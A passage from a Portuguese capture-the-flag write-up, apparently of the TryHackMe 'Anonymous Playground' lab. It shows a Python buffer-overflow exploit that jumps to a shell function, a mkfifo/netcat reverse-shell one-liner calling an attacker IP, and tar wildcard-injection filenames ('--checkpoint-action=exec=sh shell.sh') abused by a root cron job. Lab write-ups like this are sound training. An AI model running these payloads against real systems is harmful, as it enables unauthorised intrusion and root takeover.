0x0000000000400530  <span class="nb">printf</span>@plt
0x0000000000400540  gets@plt
0x0000000000400550  setuid@plt
0x0000000000400560  <span class="nb">sleep</span>@plt
0x0000000000400570  _start
0x00000000004005a0  _dl_relocate_static_pie
0x00000000004005b0  deregister_tm_clones
0x00000000004005e0  register_tm_clones
0x0000000000400620  __do_global_dtors_aux
0x0000000000400650  frame_dummy
0x0000000000400657  call_bash
0x00000000004006d8  main
0x0000000000400710  __libc_csu_init
0x0000000000400780  __libc_csu_fini
0x0000000000400784  _fini
</code></pre></div></div>
<p>O endereço da função é <code class="language-plaintext highlighter-rouge">0x0000000000400657</code>, agora precisamos fazer um script simples em python para exploração.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Desktop]
└─<span class="nv">$ </span><span class="nb">cat </span>xpl.py 
<span class="c">#!/usr/bin/python</span>

import struct

payload <span class="o">=</span> <span class="s2">"A"</span> <span class="k">*</span> 72
payload +<span class="o">=</span> struct.pack<span class="o">(</span><span class="s2">"&lt;Q"</span>, 0x0000000000400657<span class="o">)</span>

print payload
</code></pre></div></div>
<p>Vamos testar localmente nosso script.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Desktop]
└─<span class="nv">$ </span><span class="o">(</span>python xpl.py <span class="p">;</span> <span class="nb">cat</span><span class="o">)</span> | ./hacktheworld
Who <span class="k">do </span>you want to hack? 
We are Anonymous.
We are Legion.
We <span class="k">do </span>not forgive.
We <span class="k">do </span>not forget.
<span class="o">[</span>Message corrupted]...Well...done.
<span class="nb">whoami
</span>hastur
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>hastur<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>hastur<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>hastur<span class="o">)</span>,20<span class="o">(</span>dialout<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>,120<span class="o">(</span>bluetooth<span class="o">)</span>,122<span class="o">(</span>wireshark<span class="o">)</span>,135<span class="o">(</span>scanner<span class="o">)</span>,145<span class="o">(</span>kaboxer<span class="o">)</span>

</code></pre></div></div>

<p>E conseguimos o shell local com o script!!</p>

<p>Agora precisamos replicar o script na máquina alvo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>magna@anonymous-playground:~<span class="nv">$ </span><span class="nb">cat </span>xpl.py 
<span class="c">#!/usr/bin/python</span>

import struct

payload <span class="o">=</span> <span class="s2">"A"</span> <span class="k">*</span> 72
payload +<span class="o">=</span> struct.pack<span class="o">(</span><span class="s2">"&lt;Q"</span>, 0x0000000000400657<span class="o">)</span>

print payload
</code></pre></div></div>
<p>Ao executar nosso script, conseguimos um movimento lateral para o usuário <code class="language-plaintext highlighter-rouge">spooky</code>.</p>

<p><img src="/img/thm/thm-anonymousplayground-13.png" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>spooky@anonymous-playground:/home/spooky<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
total 36
drwxr-xr-x 4 spooky spooky 4096 Jul 10  2020 <span class="nb">.</span>
drwxr-xr-x 5 root   root   4096 Jul  4  2020 ..
lrwxrwxrwx 1 root   root      9 Jul  4  2020 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 spooky spooky  220 Jul  4  2020 .bash_logout
<span class="nt">-rw-r--r--</span> 1 spooky spooky 3771 Jul  4  2020 .bashrc
<span class="nt">-rwxrwxrwx</span> 1 spooky magna     0 Jul 10  2020 .confrc
<span class="nt">-r--------</span> 1 spooky spooky   33 Jul  4  2020 flag.txt
drwxrwxr-x 3 spooky spooky 4096 Jul  5  2020 .local
<span class="nt">-rw-r--r--</span> 1 spooky spooky  807 Jul  4  2020 .profile
drwx------ 2 spooky spooky 4096 Jul  8  2020 .ssh
<span class="nt">-rw-rw-r--</span> 1 spooky magna   535 Jul 10  2020 .webscript
</code></pre></div></div>

<p>A segunda <code class="language-plaintext highlighter-rouge">flag.txt</code> se encontra no diretório do usuário spooky.</p>

<h3 id="escalação-de-privilégios">Escalação de privilégios</h3>

<p>Logo no início da enumeração local, encontrei uma <code class="language-plaintext highlighter-rouge">cron</code> que roda como root a cada minuto.</p>

<pre><code class="language-bas">spooky@anonymous-playground:/home/spooky$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
*/1 *   * * *   root    cd /home/spooky &amp;&amp; tar -zcf /var/backups/spooky.tgz *
</code></pre>
<p>Esta cron, compacta todos os arquivos do diretório <code class="language-plaintext highlighter-rouge">/home/spooky</code> utilizando a ferramenta <code class="language-plaintext highlighter-rouge">tar</code>.</p>

<p>Existe uma técnica de escalação de privilégios através do tar com <code class="language-plaintext highlighter-rouge">Wildcard Injection</code>, acontece que é possível programar checkpoints na execução do tar, e informar qual a ação desse checkpoint.</p>

<p>Para isso, vamos fazer o wildcard injection no diretório de trabalho do tar, que no caso da cron, é <code class="language-plaintext highlighter-rouge">/home/spooky</code>.</p>

<p>Primeiro setamos um netcat para ouvir a conexão revarsa em nossa máquina.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Desktop]
└─<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 8443
listening on <span class="o">[</span>any] 8443 ...
</code></pre></div></div>

<p>Agora precisamos criar o script que irá fazer a conexão reversa na nossa máquina alvo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>spooky@anonymous-playground:/home/spooky<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.0.26 8443 &gt;/tmp/f"</span> <span class="o">&gt;</span> shell.sh
</code></pre></div></div>
<p>Agora adicionamos a ação do nosso checkpoint, que será executar nosso script.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>spooky@anonymous-playground:/home/spooky<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> <span class="s2">"--checkpoint-action=exec=sh shell.sh"</span>
</code></pre></div></div>
<p>E por fim, adicionamos o checkpoint de fato.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>spooky@anonymous-playground:/home/spooky<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> <span class="nt">--checkpoint</span><span class="o">=</span>1
</code></pre></div></div>

<p>Após um minuto, a cron irá rodar e nos dar o reverse shell com <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p><img src="/img/thm/thm-anonymousplayground-14.png" /></p>

<p>E conseguimos o shell com <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p>A terceira <code class="language-plaintext highlighter-rouge">flag.txt</code> se encontra em <code class="language-plaintext highlighter-rouge">/root</code>.</p>

<h3 id="conclusão">Conclusão</h3>

<p>Esta máquina foi bem divertida, pois teve uma variedade de ações entre criptografia, buffer overflow, movimento lateral, wildacrd injection…
É o tipo de trabalho que nos força a <code class="language-plaintext highlighter-rouge">sair da caixa</code>.</p>

<p><br /></p>

<p>E comprometemos o server!!
<br /></p>

<p><img src="/htb/hackerman.gif" /></p>

